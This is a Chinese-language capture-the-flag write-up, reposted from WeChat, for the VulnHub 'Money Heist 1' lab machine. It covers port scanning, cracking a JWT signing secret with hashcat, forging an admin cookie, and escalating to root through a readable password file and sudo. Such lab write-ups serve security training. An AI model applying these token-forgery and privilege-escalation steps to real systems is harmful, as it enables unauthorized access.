> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/DPTXD32tQuqqSoJq-1580Q)

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/1brjUjbpg5zGqnux86icY3iaSADXAreXiaJEIOOPug2W5Rich6Cst24vCeB65NNkoxowMh4uZIcwoSUKENv1mFW3ww/640?wx_fmt=png)

点击上方 “信安前线” 可订阅

**0x01** Introduction

* * *

虚拟机页面：http://www.vulnhub.com/entry/money-heist-1,592/  

Description

```
“The Professor” has a plan to pull off the biggest heist in recorded history – to print billions of Flags . To help him carry out the ambitious plan, he recruits eight people with certain abilities and who have nothing to lose.
```

**0x02 Writeup**  

**服务探测：**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
80/tcp   open  http
3000/tcp open  http    Node.js Express framework
3001/tcp open  nessus?
```

**web 渗透测试：**

访问 80 端口，注册用户后提示不是管理员用户。很明显是要求越权，于是查看 cookie。

![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTrAVb5OqtkGYyTJf0jCxRicqRNuylXw8QrR5Su5iaQEicItOYXDbTmsNwd91eWh5IkDK51Ny4LfEAhA/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTrAVb5OqtkGYyTJf0jCxRicjBeC1lBzjTIicSBXE5EXP81MTMl584iceSA5RUzh4HpAZDmIz201LVGg/640?wx_fmt=png)jwt token，base64 解码后为

```
{
  "email": "test1@test.com",
  "iat": 1604066840,
  "exp": 1604070440
}
```

先用 hashcat 爆破一下 secret-key 为 professor。

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3QxQHRlc3QuY29tIiwiaWF0IjoxNjA0MDY2ODQwLCJleHAiOjE2MDQwNzA0NDB9.68Qh1wCLajO59G6BepaQirUUyTOf_IgHwsgvLew_UPE:professor
```

放到 jwo.io 中，修改 email 为 admin，修改 cookie 后刷新网页，成功获取 admin flag。

![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTrAVb5OqtkGYyTJf0jCxRicauicKKOnD1DjVo009CM741Y77GOW4IsECLCZVGGpjO0BAiaSsyAsNib0g/640?wx_fmt=png)

ssh 登录 berlin（这走了一点弯路，该用户目录下有一个流量包，分析了半天发现只是 berlin 与 nairobi 的对话），进入 home 目录，发现可以进入 professor 用户目录。

```
berlin@ubuntu:/home$ ls -all
total 28
drwxr-xr-x  7 root      root      4096 Oct 13 03:06 .
drwxr-xr-x 24 root      root      4096 Sep 24 17:41 ..
drwx------  5 berlin    berlin    4096 Oct 16 13:27 berlin
drwxr-xr-x  3 root      root      4096 Sep 23 16:48 .ecryptfs
drwx------  4 nairobi   nairobi   4096 Oct 16 14:51 nairobi
drwxr-xr-x  4 professor professor 4096 Oct 16 18:06 professor
drwx------  5 tokyo     tokyo     4096 Oct 16 14:01 tokyo
berlin@ubuntu:/home$ cd professor/
berlin@ubuntu:/home/professor$ ls -all
total 32
drwxr-xr-x 4 professor professor 4096 Oct 16 18:06 .
drwxr-xr-x 7 root      root      4096 Oct 13 03:06 ..
-rw------- 1 professor professor 1180 Oct 30 19:34 .bash_history
drwx------ 2 professor professor 4096 Oct 13 16:41 .cache
-rw-r--r-- 1 root      root      4465 Oct 16 15:18 finalflag.txt
drwxrwxr-x 2 professor professor 4096 Oct 14 10:36 .nano
-rw-rw-r-- 1 professor professor   28 Oct 16 18:06 passwd.txt
-rw-r--r-- 1 professor professor    0 Oct 13 16:43 .sudo_as_admin_successful
```

passwd.txt 为该用户密码，切换到该用户下，成功获取 root 和 flag。

```
berlin@ubuntu:/home/professor$ cat passwd.txt 
st@y_tuned_for_@nother_one

berlin@ubuntu:/home/professor$ su professor
Password: 
professor@ubuntu:~$ sudo -l
[sudo] password for professor: 
Matching Defaults entries for professor on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User professor may run the following commands on ubuntu:
    (ALL : ALL) ALL
professor@ubuntu:~$ sudo cat finalflag.txt 



                    ██████╗ ███████╗██╗     ██╗      █████╗      ██████╗██╗ █████╗  ██████╗                             
                    ██╔══██╗██╔════╝██║     ██║     ██╔══██╗    ██╔════╝██║██╔══██╗██╔═══██╗                            
                    ██████╔╝█████╗  ██║     ██║     ███████║    ██║     ██║███████║██║   ██║                            
                    ██╔══██╗██╔══╝  ██║     ██║     ██╔══██║    ██║     ██║██╔══██║██║   ██║                            
                    ██████╔╝███████╗███████╗███████╗██║  ██║    ╚██████╗██║██║  ██║╚██████╔╝                            
                    ╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝     ╚═════╝╚═╝╚═╝  ╚═╝ ╚═════╝ 


    ██╗      █████╗      ██████╗ █████╗ ███████╗ █████╗     ██████╗ ███████╗    ██████╗  █████╗ ██████╗ ███████╗██╗     
    ██║     ██╔══██╗    ██╔════╝██╔══██╗██╔════╝██╔══██╗    ██╔══██╗██╔════╝    ██╔══██╗██╔══██╗██╔══██╗██╔════╝██║     
    ██║     ███████║    ██║     ███████║███████╗███████║    ██║  ██║█████╗      ██████╔╝███████║██████╔╝█████╗  ██║     
    ██║     ██╔══██║    ██║     ██╔══██║╚════██║██╔══██║    ██║  ██║██╔══╝      ██╔═══╝ ██╔══██║██╔═══╝ ██╔══╝  ██║     
    ███████╗██║  ██║    ╚██████╗██║  ██║███████║██║  ██║    ██████╔╝███████╗    ██║     ██║  ██║██║     ███████╗███████╗
    ╚══════╝╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚═════╝ ╚══════╝    ╚═╝     ╚═╝  ╚═╝╚═╝     ╚══════╝╚══════╝

                                      $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
                                      --------------------------------------------                                                                                  
                                      You have successfully completed the $ HEIST $ .
                                      --------------------------------------------
                                            Created by Team :- VIEH GROUP
                                            -----------------------------
                                            Visit us:- www.viehgroup.com
                                            -----------------------------
                                            Twitter :- @viehgroup
                                                       @shaileshkumar__
                                                       @shrey_sancheti
                                                       @manish67367326
                                     ---------------------------------------------
                          -->> flag4{W3@kn3ss_!s_not_!n_us_!t_!s_!n_wh@t_w3_h@ve_outs!de} <<--
                                     ---------------------------------------------
                                     $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$  
```

**PS：已授权，感谢大哥的文章**

更多精彩

*   [Web 渗透技术初级课程介绍](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486030&idx=2&sn=185f303a2f1b5267c0865f117931959d&chksm=fcfc3718cb8bbe0e6f3ca97859e78342852537da2bef3cd76a83cb90ee64a8ca8953b35aa67e&scene=21#wechat_redirect)
    
*   [vulnhub 之 KIOPTRIX: LEVEL 1.2 (#3) 靶场 writeup](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486968&idx=1&sn=7f66208298cf2cec57286947ddb8b223&chksm=fcfc30aecb8bb9b8333c1d05976dbdbf33d34f2a0d2b0cdfc41e835d29b9b4bcfc352504f8e4&scene=21#wechat_redirect)  
    
*   [商务合作](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486808&idx=1&sn=f50f15f9a3ab7312a08b1f932292faca&chksm=fcfc300ecb8bb918213c6070d864ffcd70ad27ab6525521c31e9ccaa57bdfa2968360ed7e8fe&scene=21#wechat_redirect)
    

![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQSd9wDlUiar0tUpHCYAzrZfTzOvS2SEw9cia9j7d1HKP2bWArPLCegs1XoejVUPu0GkSuZh7Wia7aExA/640?wx_fmt=png)

**如果感觉文章不错，分享让更多的人知道吧！**